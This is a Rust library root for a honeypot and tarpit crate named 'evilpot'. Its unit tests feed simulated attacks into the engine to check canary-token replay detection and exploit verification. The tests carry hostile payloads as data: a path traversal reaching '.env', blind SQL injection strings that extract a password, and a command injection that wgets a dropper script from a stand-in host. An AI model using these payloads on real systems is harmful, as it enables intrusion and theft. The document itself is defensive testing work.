//! # evilpot
//!
//! **Embeddable zero-copy HTTP deception, exploit verification & tarpit honeypot crate for Rust.**
//!
//! `evilpot` is designed to be embedded directly inside an existing Rust gateway, WAF, or reverse proxy
//! (such as `Exposure` or `evilpot-forefront`).
//!
//! ## Architecture & Division of Responsibility
//!
//! - **`evilpot` does NOT perform attack detection.** The caller's WAF (e.g. Exposure's `waf.rs` or
//!   `evilpot-forefront`'s `sigil-filter` inspector) identifies suspicious or malicious requests and
//!   diverts them into `evilpot` along with an [`AttackSignal`].
//! - **Tailored Deception & Exploit Verification**: Instead of returning a static `403 Forbidden`,
//!   `evilpot` serves a deterministic, rotating server persona matching the attacker's probe
//!   (SQLi error/boolean/time-blind targets, fake `.env`/`.git/config`, WordPress suite, SSRF AWS IMDSv1,
//!   SSTI evaluation, NoSQL/LDAP/XXE leaks, stateful in-memory `FakeShellSession` for RCE, or 256 MiB
//!   slow-drip tarpit streams) and tracks whether the attacker actively exploits the vulnerability:
//!   1. **Implanted Canary Token / Path Replay** (`ExploitVerificationStatus::VerifiedExploit`):
//!      Every decoy payload embeds session-bound canary API keys (`epk_...`), AWS keys (`AKIA...`),
//!      cookies, and a secret vault export route (`/api/v1/internal/vault-export/...`). If the client
//!      replays any of these in a subsequent request, `evilpot` immediately confirms 100% real exploitation.
//!   2. **Multi-Step Interaction & IOC Extraction**:
//!      Tracks SQLMap character-by-character blind extraction, stateful RCE shell command chaining &
//!      malware download URLs (`wget`/`curl`/file writes), and multi-path LFI reconnaissance.
//!   3. **Sustained Tarpit Consumption**:
//!      Monitors how many bytes and milliseconds a client spends reading from a slow-drip `.sql.gz` or
//!      `heapdump` tarpit stream, distinguishing accidental clicks from automated data-exfiltration tools.

pub mod config;
pub mod engine;
pub mod http;
pub mod layer;
pub mod persona;
pub mod shell;
pub mod trap;

pub use config::{AdminPanelConfig, EvilpotConfig};
pub use engine::{
    AttackerSessionReport, EvilpotEngine, EvilpotMetrics, EvilpotMetricsSnapshot,
    ExploitVerificationStatus, TarpitPermit, ThreatEvent, VerificationEvidence,
};
pub use http::{
    build_trap_http_response, full_body, inject_persona_headers, DeceptionOutcome, EvilpotBody,
    TarpitDripBody,
};
pub use layer::{extract_client_ip, EvilpotLayer, EvilpotService, IntoResponseBody};
pub use persona::{PersonaSnapshot, PrebakedPersona, ShellVfsData};
pub use shell::{FakeShellSession, ShellExecResult};
pub use trap::{
    extract_injected_command, percent_decode_lossy, select_trap_for_signal, AttackCategory,
    AttackSignal, LfiTargetHint, TarpitKind, TrapVerdict,
};

#[cfg(test)]
mod tests {
    use super::*;
    use ::http::{HeaderMap, HeaderValue};
    use http_body_util::BodyExt;
    use std::net::IpAddr;

    #[test]
    fn test_randomized_and_custom_admin_url_prefix() {
        let default_cfg = EvilpotConfig::default();
        let eng1 = EvilpotEngine::new(default_cfg.clone());
        let eng2 = EvilpotEngine::new(default_cfg);
        assert!(eng1.admin_path_prefix().starts_with("/_ep_"));
        assert_eq!(eng1.admin_path_prefix().len(), 37);
        assert_ne!(eng1.admin_path_prefix(), eng2.admin_path_prefix());

        let mut custom_cfg = EvilpotConfig::default();
        custom_cfg.admin.path_prefix =
            "/__my_secret_ops_panel_9f8a7c2e1b4d603f5a1c8e9d2b7410a/".to_string();
        let eng_custom = EvilpotEngine::new(custom_cfg);
        assert_eq!(
            eng_custom.admin_path_prefix(),
            "/__my_secret_ops_panel_9f8a7c2e1b4d603f5a1c8e9d2b7410a"
        );
    }

    #[test]
    fn test_deterministic_persona_sharding_and_rotation() {
        let mut cfg = EvilpotConfig::default();
        cfg.persona_slots = 8;
        let engine = EvilpotEngine::new(cfg);

        let ip1: IpAddr = "203.0.113.10".parse().unwrap();
        let ip2_same_subnet: IpAddr = "203.0.113.250".parse().unwrap();

        let p1 = engine.select_persona(ip1);
        let p2 = engine.select_persona(ip2_same_subnet);

        assert_eq!(p1.epoch_id, 1);
        assert_eq!(p1.slot_id, p2.slot_id);
        assert_eq!(p1.hostname, p2.hostname);
        assert_eq!(p1.dotenv_body, p2.dotenv_body);

        let new_snap = engine.rotate_now();
        assert_eq!(new_snap.epoch_id, 2);

        let p1_after = engine.select_persona(ip1);
        assert_eq!(p1_after.epoch_id, 2);
        assert_ne!(p1.dotenv_body, p1_after.dotenv_body);
    }

    #[tokio::test]
    async fn test_exposure_waf_signal_diversion_and_canary_verification() {
        let engine = EvilpotEngine::new(EvilpotConfig::default());
        let attacker_ip: IpAddr = "198.51.100.42".parse().unwrap();
        let headers = HeaderMap::new();

        // Step 1: Exposure WAF catches an LFI / secret leak probe and diverts it into evilpot
        let sig = AttackSignal::from_waf_finding(
            "path-traversal",
            "query",
            0.95,
            vec!["dot_dot_slash".into()],
        )
        .with_payload("file=../../../../.env");

        let outcome1 = engine
            .handle_attack(
                attacker_ip,
                "GET",
                "/download",
                Some("file=../../../../.env"),
                &headers,
                sig,
            )
            .await;

        assert_eq!(
            outcome1.session.status,
            ExploitVerificationStatus::Probing
        );
        let body_bytes = outcome1
            .response
            .into_body()
            .collect()
            .await
            .unwrap()
            .to_bytes();
        let body_str = std::str::from_utf8(&body_bytes).unwrap();

        let persona = engine.select_persona(attacker_ip);
        assert!(body_str.contains(&persona.canary_api_key));
        assert!(body_str.contains(&persona.canary_endpoint_path));

        // Step 2: Attacker extracts the fake `ADMIN_BYPASS_TOKEN` from `.env` and uses it in Authorization header!
        // Even if this second request looks syntactically benign to the WAF, `handle_canary_if_present` catches it
        // and upgrades the session to `VerifiedExploit`!
        let mut follow_up_headers = HeaderMap::new();
        follow_up_headers.insert(
            "authorization",
            HeaderValue::from_str(&format!("Bearer {}", persona.canary_api_key)).unwrap(),
        );
        let canary_outcome = engine
            .handle_canary_if_present(
                attacker_ip,
                "GET",
                "/api/v1/users",
                None,
                &follow_up_headers,
            )
            .await
            .expect("should detect replayed canary API token");

        assert_eq!(
            canary_outcome.session.status,
            ExploitVerificationStatus::VerifiedExploit
        );
        assert_eq!(canary_outcome.session.canary_triggers, 1);
        assert_eq!(engine.metrics_snapshot().canary_verifications, 1);
        assert_eq!(engine.metrics_snapshot().verified_attack_sessions, 1);
    }

    #[tokio::test]
    async fn test_multi_step_sqlmap_and_stateful_rce_verification() {
        let engine = EvilpotEngine::new(EvilpotConfig::default());
        let attacker_ip: IpAddr = "203.0.113.88".parse().unwrap();
        let persona = engine.select_persona(attacker_ip);
        let headers = HeaderMap::new();

        // 1. SQLMap boolean-blind character extraction at pos 1 and pos 2 -> upgrades to VerifiedExploit
        let c1 = persona.db_secret_row.as_bytes()[0];
        let q1 = format!(
            "id=1 AND ORD(MID((SELECT password FROM users LIMIT 0,1),1,1))>{}",
            c1 - 1
        );
        let sig1 = AttackSignal::new(AttackCategory::SqlInjection, "query", 0.92).with_payload(&q1);
        let out1 = engine
            .handle_attack(attacker_ip, "GET", "/item", Some(&q1), &headers, sig1)
            .await;
        assert_eq!(
            out1.verdict,
            TrapVerdict::SqlInjectionBoolean {
                truthy: true,
                extracted_pos: Some(1)
            }
        );

        let c2 = persona.db_secret_row.as_bytes()[1];
        let q2 = format!(
            "id=1 AND ORD(MID((SELECT password FROM users LIMIT 0,1),2,1))>{}",
            c2
        );
        let sig2 = AttackSignal::new(AttackCategory::SqlInjection, "query", 0.92).with_payload(&q2);
        let out2 = engine
            .handle_attack(attacker_ip, "GET", "/item", Some(&q2), &headers, sig2)
            .await;
        assert_eq!(
            out2.verdict,
            TrapVerdict::SqlInjectionBoolean {
                truthy: false,
                extracted_pos: Some(2)
            }
        );
        assert_eq!(
            out2.session.status,
            ExploitVerificationStatus::VerifiedExploit
        );
        assert_eq!(out2.session.sqli_distinct_positions, 2);

        // 2. Command injection RCE with malware download URL -> captures IOC in session report
        let rce_ip: IpAddr = "198.51.100.99".parse().unwrap();
        let rce_payload = "host=127.0.0.1; wget http://198.51.100.200/dropper.sh -O /tmp/a.sh";
        let rce_sig = AttackSignal::new(AttackCategory::CommandInjection, "query", 0.98)
            .with_payload(rce_payload);
        let rce_out = engine
            .handle_attack(rce_ip, "GET", "/ping", Some(rce_payload), &headers, rce_sig)
            .await;
        assert_eq!(
            rce_out.session.status,
            ExploitVerificationStatus::VerifiedExploit
        );
        assert!(rce_out
            .session
            .captured_iocs
            .iter()
            .any(|ioc| ioc.contains("http://198.51.100.200/dropper.sh")));
    }

    #[tokio::test]
    async fn test_tarpit_sustained_read_verifies_attacker() {
        let mut cfg = EvilpotConfig::default();
        cfg.tarpit_verify_min_bytes = 128;
        cfg.tarpit_drip_bytes_per_sec = 1024;
        let engine = EvilpotEngine::new(cfg);
        let ip: IpAddr = "203.0.113.199".parse().unwrap();
        let headers = HeaderMap::new();

        let sig = AttackSignal::new(AttackCategory::TarpitArchiveProbe, "path", 0.90);
        let outcome = engine
            .handle_attack(ip, "GET", "/backup.sql.gz", None, &headers, sig)
            .await;
        assert_eq!(outcome.session.status, ExploitVerificationStatus::Probing);

        // Pull first frame from TarpitDripBody (256 bytes >= 128 byte threshold)
        let mut body = outcome.response.into_body();
        let frame = body.frame().await.unwrap().unwrap();
        assert!(frame.data_ref().unwrap().len() >= 128);

        let updated = engine.session_report(ip).unwrap();
        assert_eq!(updated.status, ExploitVerificationStatus::VerifiedExploit);
        assert!(updated.tarpit_bytes_consumed >= 128);
    }
}
